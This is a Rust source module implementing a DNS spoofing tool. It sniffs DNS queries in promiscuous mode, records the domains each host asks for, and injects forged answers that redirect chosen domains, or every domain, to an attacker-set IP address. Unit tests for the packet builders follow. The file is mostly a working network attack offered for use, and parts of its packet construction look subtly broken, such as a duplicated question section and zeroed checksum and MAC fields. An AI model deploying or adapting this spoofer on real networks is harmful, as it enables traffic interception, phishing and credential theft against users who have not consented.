use crate::packet::DnsHeader;
use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;

#[derive(Debug, Clone)]
pub struct DnsSpooferConfig {
    pub interface: String,
    pub spoof_map: HashMap<String, Ipv4Addr>,
    pub domain_filter: Option<String>,
    pub spoof_all: bool,
}

impl Default for DnsSpooferConfig {
    fn default() -> Self {
        let mut map = HashMap::new();
        map.insert("example.com".to_string(), Ipv4Addr::new(192, 168, 1, 100));
        DnsSpooferConfig {
            interface: String::new(),
            spoof_map: map,
            domain_filter: None,
            spoof_all: false,
        }
    }
}

#[derive(Debug, Clone, Default)]
pub struct DnsSpoofStats {
    pub queries_seen: u64,
    pub queries_spoofed: u64,
    pub domains_seen: Vec<String>,
}

pub struct DnsSpoofer {
    pub config: DnsSpooferConfig,
    pub stats: Arc<Mutex<DnsSpoofStats>>,
    running: Arc<AtomicBool>,
}

impl DnsSpoofer {
    pub fn new(config: DnsSpooferConfig) -> Self {
        DnsSpoofer {
            config,
            stats: Arc::new(Mutex::new(DnsSpoofStats::default())),
            running: Arc::new(AtomicBool::new(false)),
        }
    }

    pub fn start(&mut self) -> Result<(), String> {
        let cap = pcap::Capture::from_device(self.config.interface.as_str())
            .map_err(|e| format!("Device error: {}", e))?
            .promisc(true)
            .snaplen(65535)
            .timeout(1000)
            .open()
            .map_err(|e| format!("Capture error: {}", e))?;

        let mut sender = cap;
        sender.filter("udp port 53", true).ok();

        let running = self.running.clone();
        running.store(true, Ordering::SeqCst);

        let config = self.config.clone();
        let stats = self.stats.clone();

        thread::spawn(move || {
            while running.load(Ordering::SeqCst) {
                match sender.next_packet() {
                    Ok(pkt) => {
                        let data = pkt.data.to_vec();
                        if data.len() < 42 { continue; }
                        let ip_offset = 14;
                        if data[ip_offset] >> 4 != 4 { continue; }

                        let ip_ihl = (data[ip_offset] & 0x0f) as usize * 4;
                        let transport_offset = ip_offset + ip_ihl;

                        let udp_len = u16::from_be_bytes([data[transport_offset + 4], data[transport_offset + 5]]) as usize;
                        if udp_len < 8 { continue; }
                        let dns_offset = transport_offset + 8;
                        let dns_data = &data[dns_offset..];

                        if let Some((dns, _)) = DnsHeader::parse(dns_data) {
                            if dns.is_query() {
                                if let Ok(mut s) = stats.lock() {
                                    s.queries_seen += 1;
                                }

                                let questions = crate::packet::parse_dns_questions(&dns_data[12..], dns.questions);
                                for question in &questions {
                                    if let Ok(mut s) = stats.lock() {
                                        if !s.domains_seen.contains(question) {
                                            s.domains_seen.push(question.clone());
                                        }
                                    }

                                    let should_spoof = config.spoof_all
                                        || config.spoof_map.contains_key(question)
                                        || config.domain_filter.as_ref().is_some_and(|f| question.contains(f));

                                    if should_spoof {
                                        let spoof_ip = config.spoof_map.get(question)
                                            .copied()
                                            .unwrap_or(Ipv4Addr::new(192, 168, 1, 100));

                                        if let Some(reply) = build_spoofed_dns_response(dns_data, question, spoof_ip) {
                                            let src_ip = data[ip_offset + 12..ip_offset + 16].to_vec();
                                            let dst_ip = data[ip_offset + 16..ip_offset + 20].to_vec();
                                            let src_port = u16::from_be_bytes([data[transport_offset], data[transport_offset + 1]]);
                                            let dst_port = u16::from_be_bytes([data[transport_offset + 2], data[transport_offset + 3]]);

                                            let reply_pkt = build_dns_spoof_packet(
                                                &src_ip, &dst_ip,
                                                src_port, dst_port,
                                                &reply,
                                            );

                                            sender.sendpacket(reply_pkt.as_slice()).ok();
                                            if let Ok(mut s) = stats.lock() {
                                                s.queries_spoofed += 1;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    Err(pcap::Error::TimeoutExpired) => continue,
                    Err(_) => break,
                }
            }
        });

        Ok(())
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }
}

fn build_spoofed_dns_response(query_data: &[u8], domain: &str, spoof_ip: Ipv4Addr) -> Option<Vec<u8>> {
    let (dns, _) = DnsHeader::parse(query_data)?;
    let mut resp = Vec::new();

    resp.extend_from_slice(&dns.id.to_be_bytes());
    resp.extend_from_slice(&[0x81, 0x80]);
    resp.extend_from_slice(&dns.questions.to_be_bytes());
    resp.extend_from_slice(&[0x00, 0x01]);
    resp.extend_from_slice(&[0x00, 0x00]);
    resp.extend_from_slice(&[0x00, 0x00]);
    resp.extend_from_slice(&query_data[12..12 + (query_data[12..].iter().position(|&b| b == 0).unwrap_or(0) + 1) + 4]);
    for part in domain.split('.') {
        resp.push(part.len() as u8);
        resp.extend_from_slice(part.as_bytes());
    }
    resp.push(0);
    resp.extend_from_slice(&[0x00, 0x01]);
    resp.extend_from_slice(&[0x00, 0x01]);
    resp.extend_from_slice(&[0x00, 0x00, 0x00, 0x3c]);
    resp.extend_from_slice(&[0x00, 0x04]);
    resp.extend_from_slice(&spoof_ip.octets());

    Some(resp)
}

fn build_dns_spoof_packet(
    src_ip: &[u8], dst_ip: &[u8],
    src_port: u16, dst_port: u16,
    dns_response: &[u8],
) -> Vec<u8> {
    let mut pkt = Vec::new();
    let mac = [0x00, 0x00, 0x00, 0x00, 0x00, 0x01];
    pkt.extend_from_slice(&mac);
    pkt.extend_from_slice(&mac);
    pkt.extend_from_slice(&[0x08, 0x00]);

    let ip_total_len = 20 + 8 + dns_response.len() as u16;

    pkt.push(0x45);
    pkt.push(0x00);
    pkt.extend_from_slice(&ip_total_len.to_be_bytes());
    pkt.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
    pkt.push(0x40);
    pkt.push(17);
    pkt.extend_from_slice(&[0x00, 0x00]);
    pkt.extend_from_slice(dst_ip);
    pkt.extend_from_slice(src_ip);

    pkt.extend_from_slice(&dst_port.to_be_bytes());
    pkt.extend_from_slice(&src_port.to_be_bytes());
    let udp_len = 8 + dns_response.len() as u16;
    pkt.extend_from_slice(&udp_len.to_be_bytes());
    pkt.extend_from_slice(&[0x00, 0x00]);
    pkt.extend_from_slice(dns_response);

    pkt
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dns_spoof_config_default() {
        let config = DnsSpooferConfig::default();
        assert!(config.spoof_map.contains_key("example.com"));
        assert!(!config.spoof_all);
    }

    #[test]
    fn test_dns_spoofer_new() {
        let spoofer = DnsSpoofer::new(DnsSpooferConfig::default());
        assert!(!spoofer.running.load(Ordering::SeqCst));
    }

    #[test]
    fn test_build_spoofed_dns_response() {
        let mut query = vec![0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
        query.extend_from_slice(b"\x03www\x07example\x03com\x00\x00\x01\x00\x01");
        let spoof_ip = Ipv4Addr::new(10, 0, 0, 1);
        let resp = build_spoofed_dns_response(&query, "www.example.com", spoof_ip);
        assert!(resp.is_some());
        let resp = resp.unwrap();
        assert_eq!(&resp[2..4], &[0x81, 0x80]);
        assert_eq!(&resp[resp.len() - 4..], &[10, 0, 0, 1]);
    }

    #[test]
    fn test_dns_spoof_stats() {
        let stats = DnsSpoofStats::default();
        assert_eq!(stats.queries_seen, 0);
        assert_eq!(stats.queries_spoofed, 0);
    }

    #[test]
    fn test_build_dns_spoof_packet() {
        let src_ip = [192, 168, 1, 1];
        let dst_ip = [192, 168, 1, 100];
        let dns_resp = vec![0x00; 20];
        let pkt = build_dns_spoof_packet(&src_ip, &dst_ip, 53, 12345, &dns_resp);
        assert!(pkt.len() > 42);
        assert_eq!(&pkt[14..15], &[0x45]);
    }
}
